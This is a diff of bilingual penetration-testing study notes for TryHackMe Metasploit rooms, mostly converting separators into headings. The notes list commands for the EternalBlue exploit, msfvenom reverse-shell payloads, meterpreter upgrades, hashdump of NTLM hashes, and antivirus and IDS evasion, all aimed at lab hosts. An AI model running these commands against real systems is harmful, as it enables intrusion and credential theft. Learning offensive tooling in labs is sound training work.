@@ -24,7 +24,7 @@
 		--> single : generic/shell_reverse_tcp
 		--> stage : windows/x64/shell/reverse_tcp
 	--> Post
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### usage
 	--> msfconsole 
 		--> msf6 > ls =>  ping -c 1 8.8.8.8
 		--> help set : set [option] [value]
@@ -57,7 +57,7 @@
 		--> sessions
 			--> sessions -i id
 		
-	--> example : ms17_010_eternalblue
+###  example : ms17_010_eternalblue
 	
 		--> use exploit/windows/smb/ms17_010_eternalblue 
 		--> show options => Module options
@@ -79,8 +79,7 @@
 ## Metasploit: Exploitation
 	--> /usr/share/wordlists/metasploit
 	--> 2024_5_CTF/try_hack_me/Jr_Penetration_Tester/task/MetasploitWordlist.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Port Scanning : 
+###  Port Scanning : 
 		--> option1 :
 			--> msf6 > nmap -sS 10.10.12.229
 		--> option2 :
@@ -103,8 +102,7 @@
 			--> NetBIOS name : netbios/nbname
 			--> port 8000 :  http_version
 			--> SMB password : smb_login
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> PostgreSQL 資料庫 : 
+### PostgreSQL 資料庫 : 
 		--> start : systemctl start postgresql
 		--> msfdb init: 初始化Metasploit資料庫 
 		--> db_status : 啟動並檢查資料庫狀態 
@@ -134,8 +132,7 @@
 			--> RDP  : Bluekeep 的攻擊或允許桌面存取
 			
 		--> vnc_login 模組可以幫助我們找到VNC服務的登入詳細資訊
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Exploitation
+###  Exploitation
 		--> search 命令搜尋漏洞利用程序
 		--> info 命令獲取有關該漏洞利用程序的更多信息
 		--> exploit 啟動該漏洞程序
@@ -147,8 +144,7 @@
 			--> sessions -i後接會話 ID 的命令與任何現有會話進行互動
 			-->  > sessions -i 1
 			
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Msfvenom : Msfpayload 和 Msfencode
+###  Msfvenom : Msfpayload 和 Msfencode
 		--> 不同的目標系統（Apple、Windows、Android、 Linux等）
 		--> 建立多種不同格式（PHP、exe、dll、elf 等）的payload
 		--> msfvenom -l payloads 
@@ -162,7 +158,7 @@
 				--> 從檔案開頭刪除的註解 (<?php) and 新增了結束標籤 (?>)
 	 		--> msf6 > use exploit/multi/handler => run
 	 		
-	 --> Other Payloads (反向負載) : 
+###  Other Payloads (反向負載) : 
 	 	--> 偵聽exploit/multi/handler模​​組 --LHOST 和 LPORT 
 	 	
 	 	--> Linux可執行和可連結格式 (elf)
@@ -178,9 +174,7 @@
 	 	--> Python
 	 		--> msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 	 		
-	 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	 
-	 --> TASK : to get other user's password hash
+###  TASK : to get other user's password hash
 	 	--> 終端1 :
 		 	--> ssh murphy@10.10.50.32
 		 	--> sudo su // root
@@ -210,8 +204,7 @@
 ## Metasploit: Meterpreter
 	--> 避免在防毒掃描期間被偵測到
 	--> 避免被基於網路的 IPS（入侵防禦系統）和IDS （入侵偵測系統）
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> upgrade to meterpreter 
+###  upgrade to meterpreter 
 		--> search shell_to_meterpreter 
 			=> 開啟另一個新會話 use 0 => use post/multi/manage/shell_to_meterpreter 
 			=> sessions -l => show options => set SESSION 1 => run 
@@ -227,7 +220,7 @@
 		--> 目標系統上可用的元件（是否安裝了Python？這是一個PHP網站嗎？等）
 		--> 與目標系統建立的網路連線類型（它們是否允許原始TCP連線 //Https )
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> command : help 列出所有可用命令
+### command : help 列出所有可用命令
 	
 	--> meterpreter > 
 		--> other : https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
@@ -262,8 +255,7 @@
 			--> hashdump NTLM Hash
 		-->  load python : load 指令來利用其他工具
 		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> 核心指令 Core commands :
+###  核心指令 Core commands :
 		--> background：目前會話的背景
 		-->exit：終止Meterpreter會話
 		-->guid：取得會話GUID（全域唯一識別碼）
@@ -323,8 +315,7 @@
 		
 		--> TASK
 			--> sysinfo : 計算機名稱
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	PAYLOAD : 
+### PAYLOAD : 
 		set PAYLOAD windows/meterpreter/reverse_tcp
 		set PAYLOAD windows/shell/reverse_tcp 
 		set PAYLOAD windows/shell_reverse_tcp
